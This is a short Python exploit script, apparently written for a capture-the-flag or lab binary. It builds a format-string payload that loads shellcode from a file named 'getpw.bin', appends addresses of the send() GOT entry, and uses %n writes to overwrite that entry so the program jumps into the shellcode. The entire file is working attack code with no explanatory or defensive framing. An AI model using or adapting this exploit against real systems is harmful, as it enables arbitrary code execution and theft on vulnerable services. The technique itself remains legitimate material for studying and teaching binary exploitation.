import struct
import sys

def h(i):
    return f'[{hex(i)} {i}]'

def next_multiple(n, m):
    return n + (m - n % m) % m

send_got = 0x0804a058

# overwrite GOT to jump after GOT entry, where we place
# jmp eax (ff e0)
# eax is the addr of the output buffer, so we jump into the output buffer
target_bytes = struct.pack('<IBB', send_got + 4, 0xff, 0xe0)

# argument number of where our input starts
in_arg_start = 260

with open('getpw.bin', 'rb') as f:
    s = f.read()

s = s.ljust(next_multiple(len(s), 4), b'\xcc')
in_arg_start += len(s) // 4

# generate format string that writes each byte of target
# addresses to write to
for i in range(6):
    s += struct.pack('<I', send_got + i)
n_start = len(s)

for i, n in enumerate(target_bytes):
    chars_needed = (n - n_start) & 0xff
    s += f'%1$0{chars_needed}d%{in_arg_start + i}$n'.encode('ascii')
    n_start += chars_needed
    # print(f'write +{h(chars_needed)} (should be {h(n_start)} = {h(n_start & 0xFF)}) to #{in_arg_start + i}', file=sys.stderr)

if s.find(b'\x00') >= 0:
    print('Warning: data contains null byte(s)!', file=sys.stderr)
sys.stdout.buffer.write(s)